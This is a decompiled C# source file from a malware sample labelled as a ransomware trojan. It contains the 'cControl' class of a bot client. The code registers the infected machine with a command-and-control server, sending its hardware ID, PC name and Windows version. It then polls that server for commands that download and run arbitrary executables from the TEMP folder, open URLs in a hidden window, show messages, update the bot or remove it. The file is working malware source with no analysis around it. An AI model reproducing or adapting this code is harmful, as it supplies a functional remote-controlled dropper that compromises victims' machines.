// Decompiled with JetBrains decompiler
// Type: Helper.cControl
// Assembly: Helper, Version=1.1.0.11, Culture=neutral, PublicKeyToken=null
// MVID: 8C3C9487-A4B3-453F-9BCD-7455B1571841
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.hedt-199b7ef219c6f0a99a826e3ee0a47da63213996c7b6ed2244ca302d914e0a744.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Helper
{
  internal class cControl
  {
    private string sOldCommand = string.Empty;

    public void ConnectControl()
    {
      this.registerCCHelper();
      new Thread(new ThreadStart(this.getCCCommand)).Start();
    }

    private void registerCCHelper()
    {
      string Parameters = "mode=0&hwid=" + cMain.ConfigClass.sHWID + "&botver=" + cMain.ConfigClass.sBotVersion + "&pcname=" + cMain.ConfigClass.sPCName + "&winver=" + cMain.ConfigClass.sWinVersion;
      while (true)
      {
        try
        {
          string str = this.myHTTPRequest(cMain.ConfigClass.sCServerAddress, Parameters);
          if (str.Length > 0)
          {
            if (str == cMain.ConfigClass.sAuthCode)
              break;
            Environment.Exit(-1);
          }
        }
        catch
        {
        }
        Thread.Sleep(cMain.ConfigClass.iConnectionInterval * 60 * 1000);
      }
    }

    private void getCCCommand()
    {
      string Parameters = "mode=1&hwid=" + cMain.ConfigClass.sHWID;
      while (true)
      {
        try
        {
          string sCommand = this.myHTTPRequest(cMain.ConfigClass.sCServerAddress, Parameters);
          if (sCommand.Length > 0)
          {
            if (sCommand != this.sOldCommand)
            {
              this.handlemyCommand(sCommand);
              this.sOldCommand = sCommand;
            }
          }
          else
            this.sOldCommand = string.Empty;
        }
        catch
        {
        }
        Thread.Sleep(cMain.ConfigClass.iConnectionInterval * 60 * 1000);
      }
    }

    private string myHTTPRequest(string URI, string Parameters)
    {
      ServicePointManager.Expect100Continue = false;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(URI);
      httpWebRequest.ContentType = "application/x-www-form-urlencoded";
      httpWebRequest.Method = "POST";
      httpWebRequest.UserAgent = cMain.ConfigClass.sAuthCode;
      byte[] bytes = Encoding.ASCII.GetBytes(Parameters);
      httpWebRequest.ContentLength = (long) bytes.Length;
      Stream requestStream = httpWebRequest.GetRequestStream();
      requestStream.Write(bytes, 0, bytes.Length);
      requestStream.Close();
      WebResponse response = httpWebRequest.GetResponse();
      return response == null ? string.Empty : new StreamReader(response.GetResponseStream()).ReadToEnd().Trim();
    }

    private void handlemyCommand(string sCommand)
    {
      string[] strArray = new string[0];
      try
      {
        strArray = sCommand.Split('*');
      }
      catch
      {
      }
      switch (strArray[0])
      {
        case "msgbox":
          try
          {
            if (Convert.ToString(strArray[1]) != null)
            {
              int num = (int) MessageBox.Show(Convert.ToString(strArray[1]), "Information", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
              break;
            }
            if (!(Convert.ToString(strArray[1]) == cMain.ConfigClass.sHWID))
              break;
            int num1 = (int) MessageBox.Show(Convert.ToString(strArray[1]), "Information", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            break;
          }
          catch
          {
            break;
          }
        case "downloadall":
          try
          {
            string str = cMain.FunctionClass.genString(new Random().Next(5, 12)) + ".exe";
            new WebClient().DownloadFile(Convert.ToString(strArray[1]), Environment.GetEnvironmentVariable("TEMP") + "\\" + str);
            new Process()
            {
              StartInfo = {
                FileName = (Environment.GetEnvironmentVariable("TEMP") + "\\" + str)
              }
            }.Start();
            break;
          }
          catch
          {
            break;
          }
        case "download":
          try
          {
            if (!(strArray[2] == cMain.ConfigClass.sHWID))
              break;
            string str = cMain.FunctionClass.genString(new Random().Next(5, 12)) + ".exe";
            new WebClient().DownloadFile(Convert.ToString(strArray[1]), Environment.GetEnvironmentVariable("TEMP") + "\\" + str);
            new Process()
            {
              StartInfo = {
                FileName = (Environment.GetEnvironmentVariable("TEMP") + "\\" + str)
              }
            }.Start();
            break;
          }
          catch
          {
            break;
          }
        case "visit":
          try
          {
            if (!(strArray[2] == cMain.ConfigClass.sHWID))
              break;
            Process process = new Process()
            {
              StartInfo = new ProcessStartInfo(Convert.ToString(strArray[1]))
            };
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.Start();
            break;
          }
          catch
          {
            break;
          }
        case "visitall":
          try
          {
            Process process = new Process()
            {
              StartInfo = new ProcessStartInfo(Convert.ToString(strArray[1]))
            };
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.Start();
            break;
          }
          catch
          {
            break;
          }
        case "update":
          cMain.SystemClass.updateHelper(Convert.ToString(strArray[1]));
          break;
        case "remove":
          if (!(strArray[1] == Environment.MachineName) && !(strArray[1].ToUpper() == "ALL"))
            break;
          cMain.SystemClass.RemoveHelper();
          break;
      }
    }
  }
}
